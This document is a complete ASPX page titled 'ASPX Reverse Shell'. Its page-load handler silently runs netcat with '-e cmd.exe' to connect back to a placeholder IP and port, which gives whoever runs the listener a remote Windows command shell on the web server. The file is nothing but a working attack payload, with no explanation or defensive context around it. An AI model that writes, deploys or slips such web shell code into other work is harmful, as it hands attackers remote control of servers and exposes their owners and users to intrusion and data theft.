<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string ip = "<LOCAL-IP>"; // Replace with your IP
        string port = "<PORT>";   // Replace with your port
        string cmd = $"nc.exe {ip} {port} -e cmd.exe";

        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = $"/c {cmd}";
        psi.CreateNoWindow = true;
        psi.UseShellExecute = false;
        Process.Start(psi);
    }
</script>
<!DOCTYPE html>
<html>
<head>
    <title>ASPX Reverse Shell</title>
</head>
<body>
    <h1>ASPX Reverse Shell Triggered</h1>
</body>
</html>
